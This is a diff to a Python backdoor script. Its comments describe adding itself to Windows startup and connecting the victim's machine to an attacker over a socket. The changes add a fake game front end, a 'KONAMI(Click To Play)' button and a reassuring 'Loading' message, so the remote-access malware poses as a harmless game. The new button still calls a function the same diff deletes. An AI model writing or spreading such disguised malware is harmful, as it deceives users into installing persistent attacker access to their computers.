@@ -22,15 +22,6 @@ root= tk.Tk()
 canvas1 = tk.Canvas(root, width = 300, height = 300)
 canvas1.pack()
 
-# def hello ():  
-#     label1 = tk.Label(root, text= 'Hello World!', fg='green', font=('helvetica', 12, 'bold'))
-#     canvas1.create_window(150, 200, window=label1)
-    
-# button1 = tk.Button(text='Click Me',command=hello, bg='brown',fg='white')
-# canvas1.create_window(150, 150, window=button1)
-
-# root.mainloop()
-
 # For Adding File To Windows Startup
 def AddToStartup(f_name, path): 
       
@@ -53,6 +44,10 @@ def AddToStartup(f_name, path):
 
 # Connecting Target To Attacker
 def connect():
+    #Showing Button before proceeding
+    label1 = tk.Label(root, text= 'Loading,... We'll tell you when done', fg='green', font=('helvetica', 12, 'bold'))
+    canvas1.create_window(150, 200, window=label1)
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # Try Until Not Connected
@@ -265,6 +260,9 @@ def connect():
             # Send Exception Message To Attacker
             s.send(str(e).encode('utf-8'))
 
+
+button1 = tk.Button(text='KONAMI(Click To Play)',command=hello, bg='brown',fg='white')
+canvas1.create_window(150, 150, window=button1)
 
 # Start Of Script
 # If Connection Breaks
